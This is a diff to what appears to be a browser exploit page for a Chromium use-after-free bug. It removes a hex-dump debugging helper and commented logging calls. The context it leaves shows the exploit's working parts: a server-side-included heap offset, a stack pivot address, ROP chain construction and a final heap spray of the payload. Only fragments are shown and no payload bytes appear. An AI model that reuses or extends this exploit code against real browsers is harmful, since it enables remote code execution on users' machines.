@@ -34,28 +34,7 @@ Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
 Result: Bug is present, crash
 -->
 <script>
-function UaF(a)
-{
-    function arrayBufferConsoleAsHex( buffer, callback ) {
-        var blob = new Blob([buffer],{type:'application/octet-binary'});
-        var reader = new FileReader();
-        reader.onload = function(evt){
-            var dataurl = evt.target.result;
-            callback(base64ToBase16(dataurl.substr(dataurl.indexOf(',')+1)));
-        };
-        reader.readAsDataURL(blob);
-    }
-    
-    function base64ToBase16(base64) {
-        return window.atob(base64)
-              .split('')
-              .map(function (aChar) {
-                return ('0' + aChar.charCodeAt(0).toString(16)).slice(-2);
-              })
-             .join('')
-             .toUpperCase(); // Per your example output
-    }
-    
+function UaF(a){    
     //Warning, the delta was modified !
     var delta                   = 0x0<!--#echo var="delta" -->000000; //from 0x0 to 0x04000000 step by 0x01000000
     var pivotAdress             = 0x010ADDCC;
@@ -141,8 +120,6 @@ function UaF(a)
         realROPChain.forEach(function(element) {
           ropchain_appendu8(element);
         });
-        
-        //arrayBufferConsoleAsHex(ar[i].buffer.slice(ropPrintStart,ropCurrentOffset), console.log.bind(console));
     }
 
     //Spray final payload
@@ -162,7 +139,6 @@ function UaF(a)
          );        
     }
     
-    //arrayBufferConsoleAsHex(ar2[0].buffer.slice(0x0,0x4000), console.log.bind(console)); 
 
     //alert("wait...");
 
